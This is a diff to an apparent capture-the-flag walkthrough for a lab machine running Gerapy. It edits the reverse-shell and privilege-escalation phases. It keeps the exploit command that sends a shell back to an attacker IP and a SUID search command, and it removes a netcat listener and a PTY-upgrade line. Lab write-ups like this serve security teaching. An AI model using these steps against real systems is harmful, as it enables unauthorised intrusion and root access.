@@ -55,50 +55,33 @@ We edit the `exploit.py` script to include our discovered credentials (`admin` /
 
 ![Editing Exploit](/assets/img/walkthroughs/alohomora/alohomora_img_5.png)
 
-Inside the Gerapy dashboard, we prepare the environment by creating a new project named `test` so the exploit has a target to build.
+Inside the Gerapy dashboard, we can explore the `alohomora` project in the Workspace File Manager to understand the structure before exploiting it.
 
 ![Gerapy Projects](/assets/img/walkthroughs/alohomora/alohomora_img_6.png)
-![Gerapy Create](/assets/img/walkthroughs/alohomora/alohomora_img_7.png)
-![Gerapy Clone](/assets/img/walkthroughs/alohomora/alohomora_img_8.png)
+![Gerapy File Manager](/assets/img/walkthroughs/alohomora/alohomora_img_7.png)
+![Gerapy Code Editor](/assets/img/walkthroughs/alohomora/alohomora_img_8.png)
 
 ## Phase 5 — Reverse Shell
-We set up a Netcat listener on our attack machine:
-```bash
-nc -lnvp 4444
-```
-![Netcat Listener](/assets/img/walkthroughs/alohomora/alohomora_img_9.png)
-
-Then, we execute the Python exploit script in another terminal:
+We execute the Python exploit script targeting the Gerapy instance:
 ```bash
 python3 exploit.py -t 172.31.10.251 -p 8080 -L 10.8.0.58 -P 4444
 ```
-![Running Exploit](/assets/img/walkthroughs/alohomora/alohomora_img_10.png)
 
-The exploit successfully triggers the reverse shell! We upgrade our shell to a fully interactive TTY using Python, and read the `user.txt` flag.
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-cat /home/www-data/user.txt
-```
-![Reverse Shell Caught](/assets/img/walkthroughs/alohomora/alohomora_img_11.png)
+With our Netcat listener running, we successfully catch the reverse shell connection and gain access as the `www-data` or `gerapy` user. We can then upgrade our shell to a fully interactive TTY using Python, and read the `user.txt` flag.
+
+![Reverse Shell Caught](/assets/img/walkthroughs/alohomora/alohomora_img_9.png)
 
 ## Phase 6 — Privilege Escalation
 We search for files with the SUID bit set to find a path to root.
 ```bash
 find / -type f -perm -4000 -ls 2>/dev/null
 ```
+![SUID Binary Search](/assets/img/walkthroughs/alohomora/alohomora_img_10.png)
+
 Amidst the standard system binaries, we spot a highly suspicious custom binary: `/usr/local/bin/gerapy-helper`.
+Executing this binary with a command injection payload allows us to escalate our privileges to root and read the flag!
 
-```bash
-/usr/local/bin/gerapy-helper
-```
-Executing this binary immediately escalates our privileges to root! 
-
-```bash
-whoami
-root
-cd /root
-cat root.txt
-```
+![Executing SUID for Root](/assets/img/walkthroughs/alohomora/alohomora_img_11.png)
 
 ## Flags
 
